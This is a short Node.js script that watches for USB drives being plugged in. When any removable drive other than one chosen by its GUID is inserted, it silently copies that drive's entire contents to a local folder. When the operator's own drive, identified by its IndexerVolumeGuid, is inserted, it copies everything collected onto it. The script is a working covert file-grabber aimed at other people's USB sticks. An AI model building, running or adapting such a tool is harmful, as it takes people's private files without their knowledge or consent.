import {list} from "drivelist"
import {usb} from "usb"
import fs from "fs"

let args = ["{0A568C21-BD20-4D90-89CD-E73184019D02}", "D:/Temp/", "Backup/"]

process.argv.slice(2, 5).forEach((value, index) => {
    args[index] = value
})

async function usbOn() {
    let mountpoints = [];
    (await list()).forEach(drive => {
        if (drive.isRemovable && drive.isUSB) {
            mountpoints = mountpoints.concat(drive.mountpoints.map(mountpoint => mountpoint.path))
        }
    })
    mountpoints.forEach(mountpoint => {
        fs.readFile(mountpoint + "System Volume Information/IndexerVolumeGuid", "utf16le", (err, data) => {
            if (! err) {
                if (data === args[0]) {
                    setTimeout((path) => {
                        if (fs.existsSync(args[1])) {
                            fs.cpSync(args[1], path + args[2] + crypto.randomUUID(), {recursive: true})
                        }
                    }, 1000, [mountpoint])
                } else if (! fs.existsSync(args[1] + data)) {
                    fs.cpSync(mountpoint, args[1] + data, {recursive: true})
                }
            }
        })
    })
}

usb.on("attach", () => setTimeout(usbOn, 1000))